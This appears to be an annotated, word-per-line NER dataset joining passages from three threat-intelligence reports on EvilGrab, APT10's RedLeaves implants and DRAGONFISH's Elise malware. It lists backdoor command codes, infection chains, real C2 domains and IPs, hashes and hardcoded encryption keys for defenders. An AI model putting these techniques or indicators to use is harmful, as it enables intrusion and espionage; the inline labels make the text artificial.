table
below
lists
its
possible
commands
:

Command
code
Description
x82
Enumerate
drives
and
their
drive
types
x83
File
listing
with
file's
last
modification
date
,
file
attribute
and
file
size
x85
Execute
downloaded
file
x86
Set
file
pointer
of
specific
file
x87
Close
file
handles
x88
Load
.DLL  B_malware.backdoor
x89
Create
directory
x8A
Delete
file
x8B
Delete
directory
tree
x8C
Get
file
time
stamps
of
a
specific
file
x8E
Either
runs
an
executable
,
loads
a
DLL B_malware.backdoor
or
open
a
file
x8F
Move
/
Rename
a
file

Steal
login
credentials
x90
Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

Command
code
Description
x92
Create
remote
shell
x93
Write
to
file
x94
ose
thread
that
created
remote
shell
x99
Send
message
to
a
certain
window
x9A
-
x9B
Related
to
change
a
specific
window's
show
state
x9C
Change
window
text
of
certain
window
x9D
,
x9F
Synthesize
key
strokes
(
i.e.
right
menu
,
shift
)
xB0
Triggers
sending
of
accumulated
stolen
information
xB1
Modify
registry
entry
value
xB2
Delete
a
value
from
registry
xB4
Modify
registry
xB5
Create
registry
entry
xB7
Delete
registry
key
xB9
Get
service
listing
info
(
service
name
,
service
type
,
service
status
,
service
setting
)
xBA
Change
service
status
xBB
Change
optional
parameters
of
certain
services
xBC
Create
service

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

Command
code
Description
xBD
Get
TCP
&
UDP
network
connections
xBE
Get
process
listing
xBF
Terminate
process
xC0Get

Get
CPU
info
,
Windows
and
System32
folder
,
hostname
,
user
name
,
clipboard
contents
xC1
Delete
its
files
and
registries
from
the
system
(
uninstall
itself
)
xE2
-
xE3
Related
to
stealing
desktop
screenshots
xE5
Get
desktop
screenshot
xE6
Get
file
listing
xE9
Connect
to
other
network
xEB
Set
mouse
event
xEC
Start
capture
window
for
media
grabbing
xEE
Media
capture
related
xF0
Start
audio
recording
xF2
Search
for
certain
files
and
steal
file
content

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

This
captured
packet
shows
sample
backdoor  B_malware.backdoor
commands  i
and
replies
:
Backdoor  B_malware.backdoor
command i
xC0 B_malware.backdoor
:
Get
CPU
info
,
Windows
and
System32
folder
,
hostname
,
user
name
and
clipboard
content
Backdoor  B_malware.backdoor
command i
x82 B_malware.backdoor
:
Get
drive
listings
and
types

These
capabilities
can
be
used
for
both
lateral
movement
within
a
compromised
organization
and
to
steal
information
.

EvilGrab B_malware.drop
steals
internal
user
names
and
passwords
as
well
as
logs
keystrokes
.

Credentials
stolen
this
way
can
be
used
to
move
within
the
confines
of
the
organization's
network
.

EvilGrab B_malware.drop
possesses
a
wide
variety
of
information
theft
capabilities
.

It
can
grab
audio
and
video
files
directly
from
devices
attached
on
the
system
(
i.e.
microphone
and
camera
)
.

In
addition
,
EvilGrab B_malware.drop
can
upload
files
from
the
affected
system
to
remote
servers
.

EvilGrab B_malware.drop
possesses
a
full
range
of
capabilities
that
is
expected
in
Malware B_malware.drop
used
in
targeted
attacks
against
organizations
.

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

Trend
Micro
Recommendations

Targeted
attacks
pose
a
challenge
to
traditional
signature-based
security
solutions
.

To
deal
with
these
type
of
threats
,
employ
solutions
that
include
network
monitoring
to
detect
and
analyze
incoming
threats
,
as
well
as
any
outgoing
communication
with
attacking
parties
.

Products
like
Trend
Micro
TM
Deep
Discovery
TM
are
capable
of
mitigating
the
risks
from
these
threats
.

One
component
of
Deep
Discovery
,
the
Deep
Discovery
Inspector
,
provides
network
threat
detection
,
custom
sandboxing
,
and
real-time
analysis
and
reporting
.

The
second
component
,
Deep
Discovery
Advisor
,
provides
sandbox
analysis
of
known
and
unknown
threats
that
augments
the
capabilities
of
existing
products
like
endpoint
solution
and
email
/
web
gateways
.

It
also
provides
visibility
to
network-wide
security
events
.

The
capabilities
provided
by
solutions
like
Deep
Discovery
are
necessary
to
provide
a
unified
,
comprehensive
view
of
the
threats
an
organization
faces
.

This
information
can
then
be
used
by
an
organization
to
create
appropriate
and
proportional
responses
to
properly
protect
an
organization's
network
.

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

References

Sancho
,
David
;
Dela
Torre
,
Jessa
;
Bakuei
,
Matsukawa
;
Villeneuve
,
Nart
;
and
McArdle
,
Robert
.
(
2013
)
.

Trend
Micro
Incorporated
Research
Paper
.

'
IXESHE B_malware.backdoor
:
An
APT
Campaign
.

'
Last
accesed
August
30
,
2013
.

http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_ixeshe.pdf

Trend
Micro
Incorporated
.
(
2013
)
.

Trend
Micro
Incorporated
Research
Paper
'
The
Taidoor B_malware.drop
Campaign  i
:
An
In-Depth
Analysis
.
'

Last
accessed
August
30
,
2013
.

http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_the_taidoor_campaign.pdf

Security
TechCenter
.
(
November
13
,
2012
)
.

Microsoft
Security
Advisory
.

'
Microsoft
Security
Advisory
(
2269637
)
:
Insecure
Library
Loading
Could
Allow
Remote
Code
Execution
'
Last
accessed
August
30
,
2013
.

http://technet.microsoft.com/en-us/security/advisory/2269637

Microsoft
.
(
2013
)
.

Windows
Dev
Center
-
Desktop
.

'
Using
the
Sample
Grabber
.
'

Last
accessed
August
30
,
2013
.

http://msdn.microsoft.com/en-us/library/windows/desktop/dd407288(v=vs.85).aspx

Microsoft
.
(
2013
)
.

Developer
Network
.

'
Recording
and
Playing
Sound
with
the
Waveform
Audio
Interface
.
'

Last
accessed
August
30
,
2013
.

http://msdn.microsoft.com/en-us/library/aa446573.aspx#waveinout_topic_006

Trend
Micro
|
2Q
Report
on
Targeted
Attack
Campaigns

Trend
Micro
Incorporated
,
a
global
leader
in
security
software
,
strives
to
make
the
world
safe
for
exchanging
digital
information
.

Our
innovative
solutions
for
consumers
,
businesses
and
governments
provide
layered
content
security
to
protect
information
on
mobile
devices
,
endpoints
,
gateways
,
servers
and
the
cloud
.

All
of
our
solutions
are
powered
by
cloud-based
global
threat
intelligence
,
the
Trend
Micro
TM
Smart
Protection
Network
TM
,
and
are
supported
by
over
1,200
threat
experts
around
the
globe
.

For
more
information
,
visit
www.trendmicro.com
.

©
2013
by
Trend
Micro
,
Incorporated
.

All
rights
reserved
.

Trend
Micro
and
the
Trend
Micro
t-ball
logo
are
trademarks
or
registered
trademarks
of
Trend
Micro
,
Incorporated
.

All
other
product
or
company
names
may
be
trademarks
or
registered
trademarks
of
their
owners
.

10101
N
.
De
Anza
Blvd
.

Cupertino
,
CA
95014
U.S
.
toll
free
:
1+800.228.5651
Phone
:1+408.257.1500
Fax
:
1+408.257.2003
THREAT
ANALYSIS

HOGFISH B_malware.infosteal
RedLeaves I
CAMPAIGN

HOGFISH B_malware.infosteal
( I
APT10 I
)
targets
Japan
with
RedLeaves
implants
in
'
new
battle
'

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

HOGFISH B_malware.infosteal
RedLeaves I
CAMPAIGN

iDefense
analysts
have
identified
recent
campaigns
attributed
to
APT10 B_malware.infosteal
,
also
known
as
HOGFISH B_malware.infosteal
and
Stone B_malware.infosteal
Panda I
.

This
report
provides
a
technical
overview
of
the
bespoke
RedLeaves
implants
leveraged
by
the
actor
in
their
'
new
battle
'
campaign
.

iDefense
is
providing
information
about
this
reported
campaign
to
the
general
iDefense
customer
base
so
that
customers
are
aware
of
the
modus
operandi
of
a
highly
active
threat
group
that
is
targeting
institutions
for
espionage
purposes
,
especially
in
Japan
.

More
specifically
,
this
threat
analysis
is
intended
for
security
operations
center
(
SOC
)
analysts
and
engineers
.

Intelligence
analysts
may
also
want
to
read
this
report
.

Additionally
,
management
and
executive
leadership
may
want
to
use
this
information
.

SOC
analysts
and
engineers
can
use
this
threat
analysis
detailed
information
pertaining
to
the
workings
of
a
malware
family
and
indicators
of
compromise
(
IoCs
)
to
contain
or
mitigate
the
discussed
threat
through
monitoring
or
blocking
.

SOC
analysts
can
use
the
information
provided
in
the
Analysis
and
Mitigation
sections
of
this
IA
to
conduct
hunting
activities
on
systems
that
may
have
already
been
compromised
.

Analysts
and
security
engineers
can
use
the
IoCs
by
adding
them
to
hunting
lists
on
Endpoint
Detection
and
Response
(
EDR
)
solutions
as
well
as
network
-
and
host-based
blacklists
to
detect
and
deny
malware B_malware.backdoor
implantation  I
and I
command-and-control I
( I
C2  I
)
communication
.

Intelligence
analysts
may
want
to
use
the
information
provided
in
this
IA
to
better
inform
their
own
analyses
.

The
provided
information
can
also
help
inform
ongoing
intelligence
analyses
and
forensic
investigations
,
particularly
for
compromise
discovery
,
damage
assessment
,
and
attribution
.

Management
and
executive
leadership
may
use
this
information
to
assess
the
risks
associated
with
the
threat
described
herein
to
make
operational
and
policy
decisions
accordingly
.

Knowledge
of
the
tactics
,
techniques
,
and
procedures
(
TTPs
)
used
by
the
operators
behind
this
campaign
helps
to
better
inform
detection
and
response
to
attacks
by
this
threat
group
.

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

HOGFISH B_malware.infosteal
RedLeaves I
CAMPAIGN

HOGFISH B_malware.infosteal
( I
APT10 I
)
TARGETS
JAPAN
WITH
RedLeaves
IMPLANTS
IN
NEW
BATTLE

RedLeaves
ANALYSIS

The
sample
that
iDefense
analyzed
for
this
report
is
a
Word
document
with
Japanese
filename
,
2018年度(平成30年度)税制改正について.doc
,
which
translates
to
English
as
'
About
the
2018
fiscal
year
(
Heisei
30
)
tax
system
revision.doc
'
.

This
document
has
the
following
properties
:

•
Filename
:
2018年度(平成30年度)税制改正について.doc
•
MD5
:
797b450509e9cad63d30cd596ac8b608  B_hash
•
File
Size
:
664.2
KB
(
680,095
bytes
)
•
Author
:
Windows
ユーザー
(
Windows
user
)
•
Last
Modified
by
:
Windows
ユーザー
(
Windows
user
)
•
Creation
Time
Stamp
:
2018-01-09
03:56:00
(
Jan
.
9
,
2018
,
3:56
a.m.
)
•
Modified
Time
Stamp
:
2018-01-09
04:25:00
(
Jan
.
9
,
2018
,
4:25
a.m.
)

After
the
document
is
opened
,
the
victim
is
presented
with
a
message
from
Office
365
to
asking
the
victim
to
'
Enable
content
'
(
see
Exhibit
1
)
.

On
the
next
page
,
however
,
iDefense
identified
what
appears
to
be
a
base64-encoded
string
.

Exhibit
1
:
Dropper
Document

The
macro
shown
in
Exhibit
2
will
then
perform
the
following
sequence
of
actions
:

•
Drop
the
embedded
base64-encoded
content
into
a
new
file
,
ZsHUvtNctKYbgPj.txt
,
in
the
%temp%
folder

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

HOGFISH B_malware.infosteal
RedLeaves I
CAMPAIGN

•
Decode
this
new
file
by
leveraging
'
certutil
'
,
a
legitimate
Windows
program
;
the
base64
encoded
data
decodes
to
a
Microsoft
Corp
.

Cabinet
file
,
which
is
saved
as
YjhdJ.cab
(
MD5
hash
:
44c7319d8d7b84c52c4a6c94056d246b  B_hash
)

•
Use
'
expand
'
,
again
a
legitimate
Windows
program
,
to
'
expand
'
or
decompress
file
contents
(
AYRUNSC.exe
and
PTL.AYM
)
to
the
%temp%
folder
,
and
consequently
delete
the
earlier
created
files

Exhibit
2
:
VBA
Macro

As
mentioned
earlier
,
this
malware B_malware.drop
creates
two
new
binaries
:
AYRUNSC.exe
and
PTL.AYM.AYRUNSC.exe
is
a
legitimate
and
digitally
signed
binary
created
by
ESTsoft
Corp.
and
pertains
to
ALYac
,
Korean
anti-virus
software
.

PTL.AYM
is
in
fact
another
binary
file
;
specifically
,
it
is
a
DLL
file
with
the
following
properties
:

•
Filename
:
PTL.AYM
Internal
Filename
:
ptl.dll

•
MD5
:
4f1ffebb45b30dd3496caaf1fa9c77e3  B_hash

•
File
Size
:
440.0
KB
(
450
,
560
bytes
)

•
Compiled
Time
Stamp
:
2018-01-08
02:15:02
(
Jan
.
8
,
2018
,
2:15
a.m.
)

The
compiled
time
stamp
,
assuming
it
is
not
altered
,
suggests
the
actor
developed
the
implant
2
days
before
launching
the
described
campaign
.

This
DLL
is
a
clone
of
a
legitimate
DLL
,
also
by
ALYac
,
and
corresponds
to
the
anti-virus
software's
Utility
Module
.

However
,
rather
than
the
original
DLL
,
it
only
has
two
imports
as
the
authors
have
implemented
a
simple
,
single-byte
XOR
obfuscation
(
using
key
0x40
)
to
obfuscate
other
imports
and
strings
.

For
example
,
XOR
decoding
the
binary
reveals
the
following
two
interesting
strings
:

•
%ProgramFiles%\Internet
Explorer
\
iexplore.exe

•
\
GppiTEMms.lnk

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

HOGFISH B_malware.infosteal
RedLeaves I
CAMPAIGN

As
opposed
to
the
original
DLL
by
ALYac
,
which
typically
has
15
exports
,
the
analyzed
sample
has
the
following
20
exports
:
•
ChangeScriptName
•
FreeList
•
GetFileName
•
GetFilePath
•
GetFilePath2
•
GetFilePathNew
•
GetFilePathNew2
•
GetFolderPath
•
GetFolderPath2
•
GetFolderPathNew
•
GetFolderPathNew2
•
GetPathVariable
•
GetPathVariableList
•
GetSIDList
•
Initialize
•
Initialize_IjDEJK
•
Lock
•
NbhgHUxiGf
•
UnInitialize
•
rGBKikBeJObSwSjY

Three
exported
functions
clearly
stood
out
:
Initialize_IjDEJK
,
NbhgHUxiGf
,
and
rGBKikBeJObSwSjY
.

These
are
,
however
,
all
dummy
exports
to
throw
off
analysts
or
perhaps
even
taunt
researchers
,
and
more
specifically
perhaps
to
taunt
the
Japan
Computer
Emergency
Response
Team
Coordination
Center
(
JPCERT
/
CC
)
.

For
example
,
when
executing
the
DLL
file
by
calling
the
NbhgHUxiGf
export
function
,
the
victim
would
be
prompted
with
a
Windows
message
box
with
'
jpcert-1
'
,
as
can
be
shown
in
Exhibit
3
and
4
.

Exhibit
3
:
Windows
message
box
creation

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

HOGFISH B_malware.infosteal
RedLeaves I
CAMPAIGN

Exhibit
4
:
Windows
message
box
with
the
message
'
jpcert-1
'

All
other
functions
are
either
empty
or
also
filled
with
calls
to
MessageBoxA()
,
which
is
unusual
for
DLL
loading
implants
.

However
,
one
export
function
,
GetFolderPathNew2
,
is
responsible
for
loading
the
RedLeaves
DLL
implant
by
performing
process
hollowing
in
iexplore.exe
,
Microsoft
Corp.'s
default
browser
.
The
initial
process
,
AYRUNSC.exe
,
is
unable
to
work
correctly
and
will
therefore
exit
.

For
persistence
,
RedLeaves
will
add
a
shortcut
'
.lnk
'
file
in
the
user's
Startup
folder
,
which
points
to
'
AYRUNSC.exe
'
,
as
shown
in
Exhibit
5
.

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

HOGFISH B_malware.infosteal
RedLeaves I
CAMPAIGN

Exhibit
5
:
GppiTEMms.lnk
in
Startup
Folder

Once
running
,
the
RedLeaves
implant
will
then
attempt
to
communicate
with
the
following
C2
domains
,
using
HTTP
,
but
connects
to
the
C2
server
on
port
443
:
•
firefoxcomt.arkouowi[.]com  B_url.cncsvr
•
update.arkouowi[.]com B_url.cncsvr

The
configuration
settings
for
the
RedLeaves
implant
can
be
extracted
from
memory
and
contains
the
following
information
:
•
Campaign
ID
:
2018-1-8-NewBattle
•
Mutex
:
jH10689DS
•
Key
:
babybear

The
string
'
2018-1-8-NewBattle
'
refers
to
the
campaign
ID
set
up
by
the
actor
and
may
allude
the
actor
starting
a
'
new
battle
'
(
campaigns
)
.

The
malware
will
create
a
unique
version
of
the
aforementioned
mutex
on
the
victim
machine
in
order
to
avoid
running
the
implant
twice
.

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

HOGFISH B_malware.infosteal
RedLeaves I
CAMPAIGN

As
mentioned
before
,
RedLeaves
will
attempt
to
communicate
over
HTTP
,
using
POST
requests
with
a
hardcoded
User-Agent
:

POST
/
M6Xz5MOS
/
index.php
HTTP
/
1.1

Connection
:
Keep-Alive

Accept
:
*
/
*

User-Agent
:
Mozilla
/
4.0
(
compatible
;
MSIE
8.0
;
Windows
NT
6.1
;
WOW64
;
Trident
/
4.0
;
SLCC2
;
.NET
CLR
2.0.50727
;
.NET
CLR
3.5.30729
;
.NET
CLR
3.0.30729
;
.NET4.0C
;
.NET4.0E
)

Network
traffic
is
encrypted
with
RC4
using
the
key
'
babybear
'
.

The
RedLeaves
implant
has
at
least
the
following
abilities
:
•
Take
screenshots
•
Gather
browser
usernames
and
passwords
•
Gather
extended
system
information
•
Send
,
receive
,
and
execute
commands
from
the
C2
server

Further
analysis
also
reveals
that
the
RedLeaves
implant
described
corresponds
to
the
actor's
'
Lavender  B_malware.drop
'
version
of
the
malware
family
.

For
example
,
the
strings
'
LAVENDERX B_malware.drop
'
and
'
LAVENDERengin B_malware.drop
'
(
which
are
dynamically
built
on
the
stack
)
are
used
to
determine
the
implant's
version
.

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

HOGFISH B_malware.infosteal
RedLeaves I
CAMPAIGN

OTHER
RedLeaves
IMPLANTS
iDefense
analysts
also
identified
the
RedLeaves
samples
with
the
following
attributes
:
ed65bbe9498d3fb1e4d4ac0058590d88
Internal
Filename
:
libcef.dll
•
Starts
in
Function
:
cef_string_utf8_to_utf16
•
Compiled
Time
Stamp
:
2018-01-18
04:38:12
(
Jan
.
18
,
2108
,
4:38
a.m.
)
•
Startup
Item/Shortcut
:
BnorTEPkh.lnk
•
C2
Server
:
algorithm.ddnsgeek[.]com  B_url.cncsvr
•
Campaign
ID
:
2018-1-18-sgowen
•
Mutex
:
rV6880B9
•
Key
:
babybear

e2627a887898b641db720531258fd133
Internal
Filename
:
libcef.dll
•
Starts
in
Function
:
cef_initialize
•
Compiled
Time
Stamp
:
2018-01-29
09:36:41
(
Jan
.
29
,
2018
,
9:36
a.m.
)
•
Startup
Item/Shortcut
:
EaahLDRej.lnk
•
C2
Server
:
friendlysupport.giize[.]com B_url.cncsvr
•
Campaign
ID
:
2018-1-29-No.1
•
Mutex
:
2N6541mb
•
Key
:
moscowww

The
above
sample
,
ed65bbe9498d3fb1e4d4ac0058590d88
,
also
displays
similar
taunting
messages
(
see
Exhibit
6
and
7
)
:

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

HOGFISH B_malware.infosteal
RedLeaves I
CAMPAIGN

Exhibit
6
:
Message
box
with
a
taunting
message

Exhibit
7
:
Message
box
with
another
taunting
message

C2
INFRASTRUCTURE
C2
infrastructure
enumeration
reveals
overlap
between
the
three
samples
that
iDefense
analyzed
,
as
Exhibit
8
illustrates
.

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

HOGFISH B_malware.infosteal
RedLeaves I
CAMPAIGN

Exhibit
8
:
Maltego
Graph
Showing
Campaigns
Overlap

MITIGATION
To
effectively
defend
against
the
threats
described
in
this
report
,
iDefense
recommends
blocking
access
to
the
following
C2  B_url.distribute
domains I
and
IP
addresses
:
firefoxcomt.arkouowi[.]com  B_url.cncsvr
•
update.arkouowi[.]com B_url.cncsvr
friendlysupport.giize[.]com B_url.cncsvr
•
algorithm.ddnsgeek[.]com  B_url.cncsvr
149.36.63[.]65
•
83.136.106[.]108

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

HOGFISH B_malware.infosteal
RedLeaves I
CAMPAIGN

Hashes
(
SHA-256
)
:
d956e2ff1b22ccee2c5d9819128103d4c31ecefde3ce463a6dea19ecaaf418a1  B_hash
5504e04083d6146a67cb0d671d8ad5885315062c9ee08a62e40e264c2d5eab91  B_hash
f6449e255bc1a9d4a02391be35d0dd37def19b7e20cfcc274427a0b39cb21b7b  B_hash
db7c1534dede15be08e651784d3a5d2ae41963d192b0f8776701b4b72240c38d  B_hash

Related
hashes
(
SHA-256
)
:
f9acc706d7bec10f88f9cfbbdf80df0d85331bd4c3c0188e4d002d6929fe4eac  B_hash
e28294f62178451c7b11988d2c790f7f44c81b0bf06ab252e60f6b9ca57cacec  B_hash
36db2c5f8bb947cad25a4abeaff1ff0e827bd7fcf9c77dbfb36247e3fc9f530a  B_hash
4de5a22cd798950a69318fdcc1ec59e9a456b4e572c2d3ac4788ee96a4070262  B_hash
7188f76ca5fbc6e57d23ba97655b293d5356933e2ab5261e423b3f205fe305ee  B_hash
388d6b38f21c79e0e2ad7ead1108025b8bb3486d8d29f2468b5cb0e54bff11d2  B_hash
37333ecdd16b1ecbcd070b202492c1870dafd799f6299a420cdcc8a9e149cc93  B_hash

For
threat
hunting
,
it
is
also
useful
to
examine
the
content
of
the
following
folders
and
look
out
for
anomalous
data
:
•
%temp%\AYRUNSC.exe
•
%temp%\PTL.AYM
•
%appdata%\Microsoft\Windows\Start
Menu\Programs\Startup\GppiTEMms.lnk
•
%appdata%\Microsoft\Windows\Start
Menu\Programs\Startup\EaahLDRej.lnk
•
%appdata%\Microsoft\Windows\Start
Menu\Programs\Startup\BnorTEPkh.lnk
•
A
mutex
named
jH10689DS
,
2N6541mb
,
or
rV6880B9
.

CONTACT
US
Joshua
Ray
joshua.a.ray@accenture.com
Bart
Parys
bart.parys@accenture.com

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

ABOUT
ACCENTURE

Accenture
is
a
leading
global
professional
services
company
,
providing
a
broad
range
of
services
and
solutions
in
strategy
,
consulting
,
digital
,
technology
and
operations
.
Combining
unmatched
experience
and
specialized
skills
across
more
than
40
industries
and
all
business
functions
—
underpinned
by
the
world's
largest
delivery
network
—
Accenture
works
at
the
intersection
of
business
and
technology
to
help
clients
improve
their
performance
and
create
sustainable
value
for
their
stakeholders
.

With
approximately
425,000
people
serving
clients
in
more
than
120
countries
,
Accenture
drives
innovation
to
improve
the
way
the
world
works
and
lives
.

Visit
us
at
www.accenture.com B_url.cncsvr

ABOUT
ACCENTURE
SECURITY

Accenture
Security
helps
organizations
build
resilience
from
the
inside
out
,
so
they
can
confidently
focus
on
innovation
and
growth
.

Leveraging
its
global
network
of
cybersecurity
labs
,
deep
industry
understanding
across
client
value
chains
and
services
that
span
the
security
lifecycle
,
Accenture
protects
organization's
valuable
assets
,
end-to-end
.

With
services
that
include
strategy
and
risk
management
,
cyber
defense
,
digital
identity
,
application
security
and
managed
security
,
Accenture
enables
businesses
around
the
world
to
defend
against
known
sophisticated
threats
,
and
the
unknown
.
Follow
us
@AccentureSecure
on
Twitter
or
visit
the
Accenture
Security
blog
.

LEGAL
NOTICE
&
DISCLAIMER
:
Given
the
inherent
nature
of
threat
intelligence
,
the
content
contained
in
this
alert
is
based
on
information
gathered
and
understood
at
the
time
of
its
creation
.

It
is
subject
to
change
.

ACCENTURE
PROVIDES
THE
INFORMATION
ON
AN
'
AS-IS
'
BASIS
WITHOUT
REPRESENTATION
OR
WARRANTY
AND
ACCEPTS
NO
LIABILITY
FOR
ANY
ACTION
OR
FAILURE
TO
ACT
TAKEN
IN
RESPONSE
TO
THE
INFORMATION
CONTAINED
OR
REFERENCED
IN
THIS
ALERT
.

©
2018
Accenture
.
All
rights
reserved
.

Accenture
,
the
Accenture
logo
,
iDefense
and
other
trademarks
,
service
marks
,
and
designs
are
registered
or
unregistered
trademarks
of
Accenture
and
its
subsidiaries
in
the
United
States
and
in
foreign
countries
.

All
trademarks
are
properties
of
their
respective
owners
.

All
materials
are
intended
for
the
original
recipient
only
.

The
reproduction
and
distribution
of
this
material
is
forbidden
without
express
written
permission
from
iDefense
.

The
opinions
,
statements
,
and
assessments
in
this
report
are
solely
those
of
the
individual
author
(
s
)
and
do
not
constitute
legal
advice
,
nor
do
they
necessarily
reflect
the
views
of
Accenture
,
its
subsidiaries
,
or
affiliates
.
THREAT
ANALYSIS

LATEST
CYBER
ESPIONAGE
MALWARE
ATTACKS

DRAGONFISH
DELIVERS
NEW
FORM
OF
ELISE B_malware.backdoor
MALWARE I
TARGETING
ASEAN
DEFENCE
MINISTERS
'
MEETING
AND
ASSOCIATES

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

THREAT
ANALYSIS

The
well-known
threat
group
called
DRAGONFISH
or
Lotus
Blossom
are
distributing
a
new
form
of
Elise B_malware.backdoor
malware I
targeting
organizations
for
espionage
purposes
.

The
threat
actors
associated
with
DRAGONFISH
have
previously
focused
their
campaigns
on
targets
in
Southeast
Asia
,
specifically
those
located
in
countries
near
the
South
China
Sea
.

These
attacks
have
mainly
targeted
high-profile
government
,
military
and
political
institutions
,
but
other
victims
include
those
operating
in
the
education
and
telecommunication
industries
.

iDefense
analysts
have
identified
a
campaign
likely
to
be
targeting
members
of
—
or
those
with
affiliation
or
interest
in
—
the
ASEAN
Defence
Ministers
'
Meeting
(
ADMM
)
.

This
threat
analysis
provides
security
operations
center
(
SOC
)
analysts
and
engineers
with
detailed
information
pertaining
to
the
workings
of
the
Elise B_malware.backdoor
malware I
family
and
the
indicators
of
compromise
(
IoCs
)
to
assist
them
in
their
own
independent
analyses
.

This
threat
analysis
will
help
to
inform
organizations
and
support
their
decision
making
on
how
to
better
contain
or
mitigate
the
threat
through
monitoring
or
blocking
.

They
may
consider
using
the
information
to
inform
hunting
activities
for
systems
that
may
already
have
been
compromised
,
or
by
using
the
IoCs
by
adding
them
to
hunting
lists
or
endpoint
detection
&
response
(
EDR
)
solutions
as
well
as
to
network
-
and
hostbased
backlists
to
detect
and
deny
malware
implantation
—
and
command
and
control
(
C2
)
communication
—
or
whatever
mitigations
they
determine
are
most
appropriate
for
their
environments
.

Given
the
inherent
nature
of
threat
intelligence
,
it
is
based
on
information
gathered
and
understood
at
a
specific
point
in
time
.

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

THREAT
ANALYSIS

TECHNICAL
REPORT

DESCRIPTION

iDefense
analysts
have
identified
a
campaign
likely
to
be
targeting
members
of
or
those
with
affiliation
or
interest
in
the
ASEAN
Defence
Minister's
Meeting
(
ADMM
)
.

iDefense
assesses
with
high
confidence
that
this
campaign
is
associated
with
the
threat
group
DRAGONFISH
(
also
known
as
Lotus
Blossom
and
Spring
Dragon
)
.

MALWARE
ANALYSIS

Knowledge
of
DRAGONFISH's
tactics
,
techniques
,
and
procedures
(
TTPs
)
helps
to
better
inform
detection
and
response
to
attacks
by
this
threat
group
.

The
sample
iDefense
identified
is
a
malicious
Microsoft
Corp
.

Word
document
(
see
Exhibit
1
)
with
the
following
properties
:

•
MD5
:
f12fc711529b48bcef52c5ca0a52335a  B_hash
•
Author
:
mary
•
Last
Modified
by
:
mary
•
Created
Time
Stamp
:
2018:01:19
14:56:00
(
Jan
.
19
,
2018
,
2:56
p.m.
)
•
Last
Modified
Time
Stamp
:
2018:01:19
14:56:00
(
JAn
.
19
,
2018
,
2:56
p.m.
)

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

THREAT
ANALYSIS

Exhibit
1
:
Decoy
Document

The
Word
document
,
which
includes
information
on
ADMM-Plus
members
,
has
a
malicious
executable
file
embedded
as
an
OLE
object
(
see
Exhibit
2
)
.

Exhibit
2
:
Original
Source
Path

The
embedded
file
named
a.b
is
dropped
to
the
%temp%
folder
once
the
Word
document
is
opened
and
is
executed
by
exploiting
the
CVE-2017-11882
vulnerability
.

The
payload
is
consequently
moved
to
\
AppData
\
Roaming
\
Microsoft
\
Windows
\
Caches
\
as
a
file
named
NavShExt.dll
and
the
executable
a.b
is
deleted
.

This
file
NavShExt.dll
is
a
PE32
dynamic-link
library
(
DLL
)
,
and
the
filename
suggests
that
the
malware B_malware.backdoor
author
intended
to
disguise
the
file
as
a
legitimate
Symantec
Corp
.
anti-virus
component
called
the
Norton
Security
Shell
Extension
Module
.

The
DLL
has
the
following
properties
:
•
MD5
Hash
:
cd36bbd7f949cf017edba0e6aaadf28c  B_hash
•
Compile
Time
:
2018-01-12
17:59:58
(
Jan
.
12
,
2018
,
5:59
p.m.
)
•
Export
Function
:
Setting

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

THREAT
ANALYSIS

The
malware B_malware.backdoor
performs
the
following
set
of
actions
:
1
.
Starts
iexplore.exe
(
Internet
Explorer
)
in
a
suspended
state

2
.
Injects
NavShExt.dll
into
the
iexplore.exe
process
and
calls
the
DLL
export
Setting
function

3
.
The
iexplore.exe
process
continues
to
run
in
the
background

4
.
Creates
a
mutex
named
donotbotherme
(
see
Exhibit
3
)
to
avoid
having
duplicated
executions

5
.
Creates
a
file
named
thumbcache_1CD60.db
in
AppData
\
Local
\
Microsoft
\
Windows
\
Explorer
\
where
the
harvested
data
is
stored

6
.
Sends
data
to
and
downloads
files
and
commands
from
the
designated
C2
server

7
.
Harvests
extensive
system
information
from
the
machine
,
such
as
the
following
:

•
LAN
and
WAN
IP
addresses
(
for
the
latter
,
it
uses
the
free
IP
address
service
ipaddress.com
)

•
Proxy
information

•
Installed
software
list

•
Process
enumeration
via
tasklist

•
List
of
all
the
files
on
the
user's
desktop

Exhibit
3
:
Mutex
Creation

Based
on
the
currently
available
intelligence
we
also
believe
the
malware B_malware.backdoor
is
capable
of
providing
the
attacker
with
a
remote
shell
on
the
host
and
can
completely
uninstall
itself
.

Execution
debug
messages
are
stored
in
the
%temp%
folder
in
a
file
named
FXSAPIDebugLogFile.tmp
.

Example
messages
include
Client
Start
!
,
indicating
a

Copyright
©
2018
Accenture
Security
.
All
rights
reserved
.

THREAT
ANALYSIS

successful
infection
,
or
an
error
message
such
as
[
2018-1-25
13:35:22
]
Try
All
Addr
Failed
!
Sleep
For
:
10.100000
Minutes
!
,
indicating
that
the
C2
sever
cannot
be
reached
and
the
malware
will
sleep
for
a
fixed
amount
of
time
.

Logs
are
encrypted
using
the
following
static
AES
key
:
Ss)4:WKsRr(3/VJrQq&2.UIqPp%1-THp
.

Of
particular
interest
is
an
embedded
,
custom
application
in
a
.data
section
that
is
responsible
for
loading
and
executing
executables
and
DLLs
from
inside
the
main
binary
.

The
application
supports
the
following
command-line
options
:

•
runexe
1.exe
/c
command
...

•
rundll
1.dll
,
